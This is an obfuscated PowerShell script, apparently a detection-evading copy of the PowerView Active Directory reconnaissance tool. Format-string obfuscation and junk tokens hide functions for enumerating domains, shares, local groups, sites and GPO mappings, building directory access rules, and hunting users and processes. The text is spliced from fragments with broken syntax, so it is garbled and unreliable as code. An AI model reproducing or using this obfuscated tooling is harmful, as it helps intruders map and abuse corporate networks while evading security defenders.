            YoV{foIJKReSTIJKoIJKBJIJKeCt}.(Z3b{5}{4}{6}{1}{0}{3}{2}Z3b -fS5zataS5z,S5zalCS5z,S5zsS5z,S5zlogS5z,S5zloS5z,S5zFindAllGS5z,S5zbS5z).Invoke()
        }
    }
}


function GET-fIJKoreIJKStSIJKcIJKheIJKmaCIJKlAsS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{3}{0}{4}{2}Z3b -fS5zroS5z,S5zPSShoulS5z,S5zsS5z,S5zdPS5z,S5zcesS5z}, S5zS5z)]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITioN = 0, VaLueFrOMPIPeLIne = YoV{tRIJKUE})]
        [Alias({Z3b{1}{0}Z3b-f S5zassS5z,S5zClS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{claSIJKsNaIJKmE},

        [Alias({Z3b{1}{0}Z3b-f S5zmeS5z,S5zNaS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{fOreIJKST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREdENIJKTIJKIal} =  (&(Z3b{2}{1}{0}Z3b-f S5zeS5z,S5zeT-VArIAbLS5z,S5zgS5z)  (S5zjS5z+S5zfiS5z)  -VAlu)::Z3bEmIJKptYZ3b
    )

    PROCESS {
        YoV{AIJKRGUIJKmeNTS} = @{}
        if (YoV{PSbIJKOUnDIJKpAIJKRameTErs}[(Z3b{0}{1}Z3b-fS5zForesS5z,S5ztS5z)]) { YoV{ArIJKGUMIJKentS}[(Z3b{0}{1}Z3b-fS5zFoS5z,S5zrestS5z)] = YoV{FIJKoIJKResT} }
        if (YoV{PsboIJKUNdpaRAIJKMIJKeIJKTeRS}[(Z3b{3}{2}{0}{1}Z3b -f S5zaS5z,S5zlS5z,S5zredentiS5z,S5zCS5z)]) { YoV{ArIJKGuMEnIJKTs}[(Z3b{2}{1}{0}Z3b-fS5zalS5z,S5zntiS5z,S5zCredeS5z)] = YoV{CIJKREDeNTIJKIAl} }

        YoV{FOrEIJKsIJKToBJEct} = &(Z3b{2','nS5z,S5zChangedS5z,S5zheS5z,S5zWS5z) YoV{PIJKRIJKOPs}.Z3bwHENIJKChanIJKgIJKedZ3b[0]
                    YoV{dOmIJKAinTIJKRusT}.Z3bpIJKSOIJKBje','LPMIJKEIJKsIJKSAge},

        [Parameter(VALueFROMPiPelIneByProPErTyNAMe = YoV{trIJKUE}, pARAmeTersetNAME ','NveIJKRTEdIJKidENTIJKITIJKyiNsIJKTIJKANCe}.(Z3b{0}{2}{1}Z3b-fS5zInS5z,S5zfS5z,S5zdexOS5z).Invoke(S5z/S5z))
                        YoV{OIJKBjECtNIJKAMe} = YoV{IDeIJKNTIJKiIJKTyIJKInStIJKANCE}.(Z3b{1}{0}Z3b -f S5zlitS5z,S5zSpS5z).Invoke(S5z5rjS5z)[1]
                        YoV{idIJKeNTIJKItIJKYIJKFIlTER} += Z3b(samAccountName=YoVObjectName)Z3b
                        YoV{SEAIJKRchIJKerIJKARgUMEIJKNTs}[(Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z)] = YoV{OBIJKjEcIJKTdomIJKAiN}
                        &(Z3b{4}{3}{0}{2}{1}Z3b-fS5z-VS5z,S5zseS5z,S5zerboS5z,S5ziteS5z,S5zWrS5z) (S5z[GeS5z+S5zt-DomaiS5z+S5znObject]S5z+S5z S5z+S5zExtracS5z+S5zteS5z+S5zdS5z+S5z S5z+S5zdomS5z+S5zain S5z+Z3bS5zYoVObjectDomainS5z Z3b+S5zfroS5z+S5zm S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{OBIJKjeCIJKTseaRIJKChIJKER} = &(Z3b{0}{3}{1}{2}Z3b -f S5zGet-DS5z,S5zaS5z,S5zinSearcherS5z,S5zomS5z) @SearcherArguments
                    }
                }
                elseif (YoV{IdeIJKNtitYINSIJKTIJKAIJKNCe}.(Z3b{1}{0}Z3b -fS5znsS5z,S5zContaiS5z).Invoke(S5z.S5z)) {
                    YoV{iDeNIJKTIIJKTyfILIJKTer} += Z3b(JGO(samAccountName=YoVIdentityInstance)(name=YoVIdentityInstance)(dnshostname=YoVIdentityInstance))Z3b
                }
                else {
                    YoV{iDEnIJKTIIJKTyFIJKilter} += Z3b(JGO(samAccountName=YoVIdentityInstance)(name=YoVIdentityInstance)(displayname=YoVIdentityInstance))Z3b
                }
            }
            if (YoV{iDeIJKNIJKTiIJKTYFiLteR} -and (YoV{idEnIJKTitIJKYfiIJKlTIJKER}.(Z3b{0}{1}Z3b -f S5','5zt-S5z,S5zSeS5z,S5zasS5z,S5zAliS5z) (Z3b{0}{1}{2}{3}{4}Z3b -fS5zInS5z,S5zvoke-UserS5z,S5zHuS5z,S5znteS5z,S5zrS5z) (Z3b{1}{0}{4}{6}{5}{3}{2}Z3b-fS5znd-S5z,S5zFiS5z,S5znS5z,S5zcatioS5z,S5zDomainS5z,S5zoS5z,S5zUserLS5z)
&(Z3b{2}{1}{0}Z3b-fS5ziasS5z,S5zet-AlS5z,S5zSS5z) (Z3b{2}{5}{1}{4}{0}{3}Z3b-f S5zntS5z,S5zoceS5z,S5zInvoS5z,S5zerS5z,S5zssHuS5z,S5zke-PrS5z) (Z3b{3}{0}{4}{2}{1}Z3b -f S5zomaiS5z,S5zssS5z,S5zoceS5z,S5zFind-DS5z','

    YoV{FIeIJKLDs} = &(Z3b{2}{0}{3}{1}Z3b-fS5zew-S5z,S5zectS5z,S5zNS5z,S5zObjS5z) (Z3b{2}{1}{3}{0}Z3b-fS5zable[]S5z,S5zhS5z,S5zHasS5z,S5ztS5z)(YoV{SIJKTrUctfiEIJKlds}.Z3bcoIJKUNtZ3b)

    
    
    
    foreach (YoV{fIJKieLd} in YoV{stRIJKUctfiIJKElIJKds}.Z3bKeIJKYsZ3b)
    {
        YoV{INDIJKEx} = YoV{sTRUIJKCtIJKFIIJKeLDs}[YoV{FIEIJKld}][(Z3b{1}{0}Z3b -fS5ztionS5z,S5zPosiS5z)]
        YoV{fiEIJKLDS}[YoV{IIJKNdEX}] = @{(Z3b{0}{2}{1}Z3b -fS5zFiS5z,S5zeS5z,S5zeldNamS5z) = YoV{FIIJKELd}; (Z3b{0}{3}{2}{1}Z3b-f S5zPropeS5z,S5zesS5z,S5ziS5z,S5zrtS5z) = YoV{STrUCIJKTfiELIJKds}[YoV{FieIJKld}]}
    }

    foreach (YoV{FIJKIeLd} in YoV{fIJKIEIJKlDs})
    {
        YoV{FiElIJKdnIJKAme} = YoV{fiEIJKLD}[(Z3b{0}{1}Z3b-fS5zFieldNS5z,S5zameS5z)]
        YoV{fIJKIElIJKDProP} = YoV{fIIJKeld}[(Z3b{2}{0}{1}Z3b-fS5zroperS5z,S5ztiesS5z,S5zPS5z)]

        YoV{oIJKFFIJKset} = YoV{fiIJKelDIJKpIJKRop}[(Z3b{0}{1}Z3b -f S5zOfS5z,S5zfsetS5z)]
        YoV{tyIJKpe} = YoV{FIElIJKdIJKProp}[(Z3b{0}{1}Z3b -fS5zTS5z,S5zypeS5z)]
        YoV{marSIJKhaIJKlAS} = YoV{FIJKIIJKEIJKLDpRoP}[(Z3b{0}{2}{1}Z3b -fS5zMarS5z,S5zhalAsS5z,S5zsS5z)]

        YoV{NeWIJKFIIJKEIJKlD} = YoV{StRIJKUctIJKBIJKUilIJKdeR}.(Z3b{1}{2}{0}Z3b -fS5zFieldS5z,S5zDeS5z,S5zfineS5z).Invoke(YoV{fIJKieIJKlIJKDNamE}, YoV{tIJKYpe}, (Z3b{1}{0}Z3b -fS5zcS5z,S5zPubliS5z))

        if (YoV{MarSIJKHIJKAlAs})
        {
            YoV{uIJKNIJKmaNAgIJKEdtyPE} = YoV{mIJKAIJKRShaIJKlAS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (YoV{MIJKARIJKshAIJKLAS}[1])
            {
                YoV{SIJKiZE} = YoV{MIJKAIJKRshalIJKAs}[1]
                YoV{atIJKTrIIJKBBIJKUILdIJKeR} = &(Z3b{1}{2}{0}Z3b-f S5zObjectS5z,S5zNS5z,S5zew-S5z) (Z3b{6}{0}{2}{1}{5}','S5z,S5zectoryS5z,S5zServices.ActS5z,S5ziveDirS5z,S5zssRuS5z,S5zoryS5z,S5zleS5z,S5zAcceS5z,S5zDirS5z) -ArgumentList YoV{idIJKENtiTy}, YoV{AdIJKRIJKiGhT}, YoV{aCCEsIJKsIJKCOnIJKTrIJKOltYpe}
            } elseif(YoV{ObJECIJKTTyIJKPE} -eq YoV{NUIJKlL} -and YoV{InherIIJKTAIJKNcIJKetyPE} -ne  YoV{qPUIJK29}::Z3beIJKMPTyZ3b -and YoV{iNheIJKRItIJKedOBJeIJKcTtYIJKpE} -eq YoV{nIJKULL}) {
                &(Z3b{0}{2}{1}Z3b -fS5zNS5z,S5zw-ObjectS5z,S5zeS5z) (Z3b{0}{1}{8}{2}{6}{7}{10}{9}{5}{11}{4}{3}{12}Z3b -fS5zSystS5z,S5zeS5z,S5zySS5z,S5zssRuS5z,S5zceS5z,S5zirectoryAS5z,S5zeS5z,S5zrvicS5z,S5zm.DirectorS5z,S5zctiveDS5z,S5zes.AS5z,S5zcS5z,S5zleS5z) -ArgumentList YoV{IdEIJKNIJKTITy}, YoV{adrIJKIIJKGHt}, YoV{aCIJKcESSConIJKTROLIJKTYIJKpe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]YoV{inIJKHerIJKitanCEIJKTIJKypE})
            } elseif(YoV{obJIJKEcTTYIJKPe} -eq YoV{NIJKULl} -and YoV{iNheriIJKTanceIJKTyIJKPe} -ne  ( &(S5zGiS5z)  VariABle:qPU29  ).Z3bvAIJKlUEZ3b::Z3beIJKMptyZ3b -and YoV{iNhIJKERiTeDoIJKBJecIJKTTIJKyPe} -ne YoV{NIJKULL}) {
                &(Z3b{2}{0}{1}Z3b -f S5zew-ObS5z,S5zjectS5z,S5zNS5z) (Z3b{11}{2}{7}{5}{8}{6}{10}{9}{0}{4}{1}{3}{12}Z3b-fS5zyS5z,S5zcessS5z,S5ztemS5z,S5zRulS5z,S5zAcS5z,S5ziS5z,S5zcS5z,S5z.DS5z,S5zrectoryServiS5z,S5ziveDirectorS5z,S5zes.ActS5z,S5zSysS5z,S5zeS5z) -ArgumentList YoV{iDIJKEntIJKITY}, YoV{adIJKRIJKIgHt}, YoV{AcCIJKeSsConTIJKROlIJKTYpe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]YoV{inhIJKERITIJKAncETyIJKpE}), YoV{iNhIJKERiIJKTeDOBIJKJeIJKcTtYpe}
            } elseif(YoV{OBIJKJeIJKcIJKTtYPe} -ne YoV{NuIJKLL} -and YoV{inHerITAncIJKeTIJKyIJKPe} -eq   ( &(Z3b{2}{3}{1}{0}Z3b-f S5zABleS5z,S5zARIS5z,S5zgeTS5z,S5z-VS5z) qPU29 -VAlue)::Z3beIJKmpTyZ3b -and YoV{iNIJKheRITeDoBJeIJKcIJKTTIJKypE} -eq YoV{NIJKUlL}) {
                &(Z3b{2}{0}{1}Z3b -fS5z-ObS5z,S5zjectS5z,S5zNewS5z) (Z3b{2}{4}{6}{10}{8}{1}{3}{9}{5}{0}{7}Z3b -f S5zryAS5z,S5zviceS5z,S5zSysS5z,S5zsS5z,S5ztem.DiS5z,S5zectoS5z,S5zrectoS5z,S5zccessRuleS5z,S5zSerS5z,S5z.ActiveDirS5z,S5zryS5z) -ArgumentList YoV{IIJKDIJKEntiTy}, YoV{ADIJKRIGhT}, YoV{aIJKccesSIJKCOnTRoIJKlTYPE}, YoV{oBjEcttIJKYIJKPE}
            } elseif(YoV{oBIJKJIJKecttIJKYPE} -ne YoV{nuIJKLl} -and YoV{iIJKNhERIIJKTaNcIJKETYpe} -ne   ( &(Z3b{1}{0}{2}{3}Z3b -f S5z-S5z,S5zgetS5z,S5zVaRiaBS5z,S5zLES5z) QPU29  -vAlue  )::Z3bEIJKmpTyZ3b -and YoV{INheRiTedobIJKjIJKeIJKCttYPe} -eq YoV{NIJKULl}) {
                &(Z3b{1}{0}{3}{2}Z3b-fS5zbS5z,S5zNew-OS5z,S5ztS5z,S5zjecS5z) (Z3b{7}{5}{8}{2}{4}{6}{0}{1}{3}{9}Z3b-fS5zoryAccS5z,S5zessS5z,S5zActiveDS5z,S5zRulS5z,S5zireS5z,S5ztem.DirectoryS5z,S5zctS5z,S5zSysS5z,S5zServices.S5z,S5zeS5z) -ArgumentList YoV{identiIJKTY}, YoV{adrIGIJKHT}, YoV{accEssIJKcOIJKNtRolIJKTIJKyIJKPE}, YoV{OIJKBjECIJKTTYPe}, YoV{iNHerIJKIIJKTAIJKNcIJKetYpe}
            } elseif(YoV{oBjEIJKCtIJKTyIJKpE} -ne YoV{nUIJKlL} -and YoV{INhIJKERitaIJKNCEtIJKyPE} -ne   (  &(Z3b{0}{1}Z3b-fS5zgCS5z,S5ziS5z) (Z3bvAriAZ3b+Z3bble:QZ3b+Z3bpZ3b+Z3bUZ3b+Z3b29Z3b)).Z3bvalIJKUeZ3b::Z3beMpIJKTYZ3b -and YoV{inIJKHeRiTIJKeIJKDOBJECtTIJKypE} -ne YoV{nuIJKll}) {
                &(Z3b{0}{2}{1}Z3b -fS5zNew-ObjS5z,S5zctS5z,S5zeS5z) (Z3b{3}{1}{4}{9}{8}{6}{7}{5}{0}{10}{2}Z3b -f S5zceS5z,S5ztS5z,S5zsRuleS5z,S5zSysS5z,S5zem.DireS5z,S5zAcS5z,S5zrviS5z,S5zces.ActiveDirectoryS5z,S5ztorySeS5z,S5zcS5z,S5zsS5z) -ArgumentList YoV{iDentiIJKTy}, YoV{aIJKdIJKRIgHt}, YoV{ACIJKCESsIJKcoNIJKTrOLTYpe}, YoV{OBJIJKecIJKTtype}','     
                        

                        YoV{MEIJKmIJKBER}
                    }
                }
                catch {
                    &(Z3b{3}{2}{1}{0}Z3b-f S5zseS5z,S5zoS5z,S5zVerbS5z,S5zWrite-S5z) (S5z[S5z+S5zGet-S5z+S5zNS5z+S5zetS5z+S5zLocalS5z+S5zGS5z+S5zrouS5z+S5zpMember] S5z+S5zErrorS5z+S5z S5z+S5zfS5z+S5zor S5z+Z3bYoVComputer Z3b+S5z: S5z+Z3bYoV_Z3b)
                }
            }
        }
    }
    
    END {
        if (YoV{LIJKOgOnIJKTokeN}) {
            &(Z3b{5}{0}{3}{2}{4}{1}Z3b -f S5zoS5z,S5zertToSelfS5z,S5z-RS5z,S5zkeS5z,S5zevS5z,S5zInvS5z) -TokenHandle YoV{LIJKOgOIJKNTOIJKkEn}
        }
    }
}


function getIJK-nEtIJKShaRE {


    [OutputType({Z3b{5}{1}{3}{2}{4}{0}Z3b -f S5zoS5z,S5zew.S5z,S5zareS5z,S5zShS5z,S5zInfS5z,S5zPowerViS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItiON = 0, vALuefrOmPIpELInE = YoV{TrIJKUe}, VaLuEFRoMPIPeLineBYpRopeRTyNamE = YoV{TIJKRUE})]
        [Alias({Z3b{0}{1}Z3b-fS5zHostNS5z,S5zameS5z}, {Z3b{0}{2}{3}{1}Z3b-f S5zdnshostS5z,S5zeS5z,S5znS5z,S5zamS5z}, {Z3b{1}{0}Z3b-fS5zeS5z,S5znamS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cOMpuTEIJKRIJKNAIJKmE} = (Z3b{1}{2}{0}Z3b -f S5zlhostS5z,S5zlocS5z,S5zaS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREDeNIJKTIJKiAl} =   (&(Z3b{1}{0}{2}Z3b-fS5zt-VariaS5z,S5zGeS5z,S5zbLES5z)  Jfi ).Z3bvALIJKUeZ3b::Z3b','5ze-S5z,S5zVerbS5z) Z3b[Get-NetLocalGroup] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
                }
            }
            else {
                
                YoV{CIJKoMPUtErpROIJKVIJKIDEr} = [ADSI]Z3bWinNT://YoVComputer,computerZ3b

                YoV{CompUIJKTEIJKRprIJKOVIJKidIJKer}.Z3bPSBAIJKseZ3b.Z3bcHiIJKlIJKdReNZ3b JGO &(Z3b{3}{0}{1}{2}Z3b -fS5z-OS5z,S5zbjS5z,S5zectS5z,S5zWhereS5z) { YoV{_}.Z3bPsBIJKAsEZ3b.Z3bSchIJKEIJKMAClassNIJKAMeZ3b -eq (Z3b{0}{1}Z3b-fS5zgroS5z,S5zupS5z) } JGO &(Z3b{0}{1}{2}{3}Z3b -f S5zFoS5z,S5zrEach-OS5z,S5zbS5z,S5zjectS5z) {
                    YoV{LoIJKCalGroIJKUP} = ([ADSI]YoV{_})
                    YoV{gIJKRoIJKUP} = &(Z3b{1}{0}{3}{2}Z3b-fS5z-OS5z,S5zNewS5z,S5zctS5z,S5zbjeS5z) (Z3b{1}{2}{0}Z3b-f S5zctS5z,S5zPSObjS5z,S5zeS5z)
                    YoV{gIJKROIJKUP} JGO &(Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zAdd-MS5z,S5zembS5z) (Z3b{3}{2}{0}{1}Z3b -fS5zropertS5z,S5zyS5z,S5zepS5z,S5','{2}{3}Z3b-fS5zSS5z,S5zimeS5z,S5zLimS5z,S5zitS5z,S5zerverTS5z)] = YoV{SIJKervIJKeIJKRtimElimIT} }
        if (YoV{pSbOuIJKNdIJKPIJKARaMeTeRs}[(Z3b{2}{1}{0}Z3b-fS5zrityMasksS5z,S5zcuS5z,S5zSeS5z)]) { YoV{sEARcheIJKRarguMIJKeIJKNIJKTS}[(Z3b{3}{2}{1}{0}Z3b-f S5zsksS5z,S5zurityMaS5z,S5zecS5z,S5zSS5z)] = YoV{SEcuIJKRITyIJKMaSKs} }
        if (YoV{psBoUIJKNdPaIJKRaIJKmEtErS}[(Z3b{2}{1}{0}Z3b-fS5zbstoneS5z,S5zmS5z,S5zToS5z)]) { YoV{SeARChIJKeRArIJKGumIJKEnIJKTs}[(Z3b{1}{0}{2}Z3b-fS5zbstoS5z,S5zTomS5z,S5zneS5z)] = YoV{TomBsIJKTOIJKNE} }
        if (YoV{PIJKsbOuIJKNDPaRamIJKEterS}[(Z3b{0}{1}{2}Z3b-f S5zCredS5z,S5zenS5z,S5ztialS5z)]) { YoV{searIJKcHEIJKRARguIJKMeIJKNTS}[(Z3b{1}{2}{0}Z3b-f S5zntialS5z,S5zCredS5z,S5zeS5z)] = YoV{cRIJKeIJKDENIJKTial} }
        YoV{SIJKiIJKTIJKesEaRChEr} = &(Z3b{0}{2}{1}{4}{3}Z3b -fS5zGS5z,S5zt-DomaiS5z,S5zeS5z,S5zSearcherS5z,S5znS5z) @SearcherArguments
    }

    PROCESS {
        if (YoV{SIJKITesearChIJKer}) {
            YoV{IDEntITYfIJKiLIJKTIJKer} = S5zS5z
            YoV{fiIJKLteR} = S5zS5z
            YoV{IdIJKentIJKIty} JGO &(Z3b{2}{1}{0}Z3b -f S5zctS5z,S5zjeS5z,S5zWhere-ObS5z) {YoV{_}} JGO &(Z3b{0}{2}{1}{3}{4}Z3b-fS5zForS5z,S5zacS5z,S5zES5z,S5zh-ObjeS5z,S5zctS5z) {
                YoV{iDeNIJKTiIJKTyInstAIJKNce} = YoV{_}.(Z3b{0}{1}Z3b-f S5zReplaS5z,S5zceS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{0}Z3b-fS5zeplaceS5z,S5zRS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IDenTIJKItyIJKiIJKNsTANCe} -match (Z3b{1}{0}{2}Z3b-fS5zCN=.S5z,S5z^S5z,S5z*S5z)) {
                    YoV{IIJKdEIJKNIJKTITYFIJKILtER} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{pSBoIJKUNdIJKPaRIJKAmETeRs}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)]) -and (-not YoV{pSbOunDpaRAIJKmIJKeIJKTerS}[(Z3b{0}{3}{2}{1}Z3b-fS5zSeS5z,S5zeS5z,S5zchBasS5z,S5zarS5z)])) {
                        
                        
                        YoV{iDIJKeNTitydOIJKMIJKAin} = YoV{iDenIJKTIJKItyINstAIJKNIJKCe}.(Z3b{0}{3}{1}{2}Z3b-fS5zSS5z,S5ztrinS5z,S5zgS5z,S5zubSS5z).Invoke(YoV{iDENtiIJKTyIJKInIJKsIJKTanCe}.(Z3b{1}{0}{2}Z3b -fS5zdexOS5z,S5zInS5z,S5zfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{0}{1}{2}{4}{3}Z3b-fS5zWritS5z,S5ze-VS5z,S5zerbS5z,S5zeS5z,S5zosS5z) (S5z[Get-DomainS5z+S5zSiS5z+S5zteS5z+S5z] S5z+S5zExtraS5z+S5zctedS5z+S5z S5z+S5zdomS5z+S5zain S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfroS5z+S5zm S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{SeAIJKRChIJKERIJKArgumeIJKNTs}[(Z3b{1}{0}Z3b-f S5zinS5z,S5zDomaS5z)] = YoV{IDEntitydoIJKMIJKAIJKIn}
                        YoV{sIJKITEsEAIJKRIJKcIJKHEr} = &(Z3b{2}{4}{5}{0}{1}{3}Z3b-fS5zaiS5z,S5znSearcS5z,S5zGeS5z,S5zherS5z,S5ztS5z,S5z-DomS5z) @SearcherArguments
      ','fS5zDomaiS5z,S5zpleS5z,S5znSimS5z)      =   5  
            (Z3b{1}{0}{2}{3}Z3b-fS5zrpriS5z,S5zEnteS5z,S5zseSimpS5z,S5zleS5z)  =   6  
            (Z3b{1}{0}Z3b -f S5zDS5z,S5zGUIS5z)              =   7  
            (Z3b{1}{0}Z3b -fS5znownS5z,S5zUnkS5z)           =   8  
            S5zUPNS5z               =   9  
            (Z3b{0}{1}{2}Z3b-fS5zCanS5z,S5zonicS5z,S5zalExS5z)       =   10 
            S5zSPNS5z               =   11 
            S5zSIDS5z               =   12 
        }

        
        function iNIJKVokeIJK-meThIJKoD([__ComObject] YoV{OIJKBJEcT}, [String] YoV{meIJKThod}, YoV{parAmIJKeIJKTeIJKRS}) {
            YoV{OIJKUTpIJKUT} = YoV{NIJKUlL}
            YoV{oIJKUIJKTPUt} = YoV{ObjIJKECT}.(Z3b{1}{2}{0}Z3b-fS5zypeS5z,S5zGS5z,S5zetTS5z).Invoke().(Z3b{3}{2}{1}{0}Z3b-f S5zmberS5z,S5zeS5z,S5znvokeMS5z,S5zIS5z).Invoke(YoV{MethIJKOD}, (Z3b{0}{1}{2}{3}Z3b-f S5zInvokeMeS5z,S5zthS5z,S5zoS5z,S5zdS5z), YoV{nuIJKLL}, YoV{obIJKJeCt}, YoV{paIJKRAmIJKEterS})
            &(Z3b{0}{2}{1}Z3b-f S5zWrite-OutS5z,S5ztS5z,S5zpuS5z) YoV{oUIJKTIJKPuT}
        }

        function getIJK-pROIJKpErIJKTY([__ComObject] YoV{oIJKBjEIJKct}, [String] YoV{PIJKRoPerIJKTy}) {
            YoV{oBIJKjeIJKcT}.(Z3b{0}{1}Z3b-fS5zGeS5z,S5ztTypeS5z).Invoke().(Z3b{3}{2}{0}{1}Z3b-f S5zbeS5z,S5zrS5z,S5zMemS5z,S5zInvokeS5z).Invoke(YoV{pIJKRopeIJKRIJKTy}, (Z3b{1}{2}','IJKeNIJKTS}[(Z3b{3}{0}{1}{2}Z3b-f S5ztS5z,S5zPageSizS5z,S5zeS5z,S5zResulS5z)] = YoV{rIJKeSUIJKLTPAIJKGesize} }
        if (','KUp}
                        YoV{GPOIJKloCAIJKlIJKGrouIJKPmIJKApPing} JGO &(Z3b{1}{2}{0}Z3b-f S5zberS5z,S5zAdd-MeS5z,S5zmS5z) (Z3b{1}{0}{2}{3}Z3b-f S5zotS5z,S5zNS5z,S5zeS5z,S5zpropertyS5z) (Z3b{1}{0}{2}Z3b -fS5zsS5z,S5zGPODiS5z,S5zplayNameS5z) YoV{GpIJKoNIJKAMe}
                        YoV{gPOIJKLOcaLgrIJKoUPMIJKAIJKpPIJKinG} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdd-MembS5z,S5zrS5z,S5zeS5z) (Z3b{2}{3}{1}{0}Z3b-f S5zyS5z,S5zrtS5z,S5zNoS5z,S5ztepropeS5z) (Z3b{0}{1}Z3b -f S5zGPS5z,S5zOGuidS5z) YoV{gPIJKOGUIJKiD}
                        YoV{gPIJKoLoCIJKAlGROuIJKPmAPpIJKiNG} JGO &(Z3b{1}{0}{2}Z3b -f S5zmS5z,S5zAdd-MeS5z,S5zberS5z) (Z3b{1}{2}{0}Z3b-fS5ztyS5z,S5zNoteprS5z,S5zoperS5z) (Z3b{1}{2}{0}Z3b-fS5zhS5z,S5zGPOPS5z,S5zatS5z) YoV{GpIJKOPAIJKTH}
                        YoV{gPOLOCIJKALIJKGrIJKOupMapPiNG} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MemS5z,S5zbeS5z,S5zrS5z) (Z3b{2}{0}{1}Z3b-fS5zotepS5z,S5zropertyS5z,S5zNS5z) (Z3b{1}{0}Z3b-f S5zeS5z,S5zGPOTypS5z) YoV{GpoIJKTIJKYPE}
                        YoV{GIJKPOIJKLOIJKcIJKAIJKLgrOupIJKmAppiNg} JGO &(Z3b{2}{0}{1}Z3b-fS5zdd-S5z,S5zMemberS5z,S5zAS5z) (Z3b{3}{0}{2}{1}Z3b-f S5zeS5z,S5ztyS5z,S5zrS5z,S5zNotepropS5z) (Z3b{1}{3}{0}{2}Z3b-fS5zerS5z,S5zContS5z,S5zNameS5z,S5zainS5z) YoV{_}.Z3bpIJKRopErtIJKiESZ3b.Z3bdIJKistIJKinIJKguISheDnAmEZ3b
                        YoV{GPOIJKLIJKOIJKcAlGIJKRoupMAIJKpPIIJKNg} JGO &(Z3b{0}{2}{1}Z3b -fS5zAddS5z,S5zmberS5z,S5z-MeS5z) (Z3b{1}{0}{2}{3}Z3b-fS5zproperS5z,S5zNoteS5z,S5ztS5z,S5zyS5z) (Z3b{3}{1}{0}{2}Z3b -fS5zmS5z,S5zNaS5z,S5zeS5z,S5zComputerS5z) YoV{OucoMpUIJKTIJKers}
                        YoV{gpolIJKoIJKCalgIJKROUPMapIJKPING}.Z3bPsIJKoIJKBjECTZ3b.Z3bTYpeIJKNaMesZ3b.(Z3b{0}{1}Z3b -fS5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{1}{2}{4}{6}{5}{0}{3}Z3b-fS5zpiS5z,S5zPS5z,S5zowerView.GS5z,S5zngS5z,S5zPS5z,S5zroupMapS5z,S5zOLocalGS5z))
                        YoV{GpOIJKLIJKocAIJKLIJKgRIJKoUPMapPINg}
                    }
                }
            }

            
            &(Z3b{1}{2}{0}Z3b -fS5zomainSiteS5z,S5zGet-S5z,S5zDS5z) @CommonArguments -Properties (Z3b{6}{1}{4}{8}{0}{7}{5}{2}{3}Z3b -f S5zl,distS5z,S5ztS5z,S5zshedS5z,S5znameS5z,S5zeobjeS5z,S5zguiS5z,S5zsiS5z,S5zinS5z,S5zctbS5z) -GPLink YoV{GIJKPOIJKguId} JGO &(Z3b{2}{0}{3}{1}Z3b -f S5zrEaS5z,S5zctS5z,S5zFoS5z,S5zch-ObjeS5z) {
                ForEach (YoV{TARIJKGIJKeTSID} in YoV{TARIJKgEIJKTIJKObjEctIJKSIDS}) {
                    YoV{OIJKBIJKjECt} = &(Z3b{3}{2}{0}{4}{1}Z3b -f S5zinObS5z,S5zctS5z,S5z-DomaS5z,S5zGetS5z,S5zjeS5z) @CommonArguments -Identity YoV{tARGEIJKTSIJKiD} -Properties (Z3b{15}{7}{5}{1}{10}{8}{9}{6}{2}{16}{14}{4}{11}{0}{12}{3}{13}Z3b -fS5ze,obS5z,S5z,saS5z,S5ziS5z,S5zsS5z,S5zing','}[(Z3b{1}{0}{2}Z3b-f S5zervS5z,S5zSS5z,S5zerS5z)]) {
            
            YoV{BinDSeIJKRvIJKER} = YoV{SErIJKVIJKEr}
        }

        YoV{seAIJKRCHIJKstriIJKNG} = (Z3b{0}{1}{2}Z3b -fS5zLS5z,S5zDAP:/S5z,S5z/S5z)

        if (YoV{bIJKIIJKNdSErvIJKER} -and (YoV{BIJKIIJKNdsEIJKRver}.(Z3b{1}{0}Z3b-fS5zrimS5z,S5zTS5z).Invoke() -ne S5zS5z)) {
            YoV{SEaIJKRcHSIJKTIJKRIIJKNg} += YoV{BIJKinDsERVIJKER}
            if (YoV{TARIJKGeTDomAIJKIn}) {
                YoV{SEIJKARCHsTRIJKING} += S5z/S5z
            }
        }

        if (YoV{pIJKsBoUNdPAIJKRaMEteIJKRS}[(Z3b{0}{1}{2}{3}Z3b-fS5zSearS5z,S5zchBaS5z,S5zsePreS5z,S5zfixS5z)]) {
            YoV{seaRcIJKhsTrIIJKNg} += YoV{SIJKEARCHIJKBIJKASepReFiX} + S5z,S5z
        }

        if (YoV{PSBouNIJKDpIJKArIJKAmeTIJKERS}[(Z3b{2}{1}{0}{3}Z3b -f S5zBaS5z,S5zarchS5z,S5zSeS5z,S5zseS5z)]) {
            if (YoV{sEIJKArchIJKBASe} -Match (Z3b{1}{0}Z3b-f S5zGC://S5z,S5z^S5z)) {
                
                YoV{Dn} = YoV{sEarCHBIJKAIJKSe}.(Z3b{1}{0}{2}Z3b -fS5zoUppS5z,S5zTS5z,S5zerS5z).Invoke().(Z3b{0}{1}Z3b-fS5zTriS5z,S5zmS5z).Invoke(S5z/S5z)
